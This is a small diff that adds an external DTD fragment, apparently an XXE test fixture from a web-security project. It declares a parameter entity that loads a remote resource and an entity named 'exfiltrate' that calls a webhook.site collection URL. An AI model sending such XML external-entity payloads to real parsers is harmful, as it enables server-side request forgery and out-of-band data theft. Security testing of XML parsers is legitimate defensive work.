@@ -1,0 +1,3 @@
+<!ENTITY % payload SYSTEM "https://internal.websec.cs.uni-paderborn.de/second">
+<!ENTITY % send "<!ENTITY exfiltrate SYSTEM 'https://webhook.site/8b3b8cfa-0663-4ca8-a4e4-f833e1e06e3c'>">
+%send;
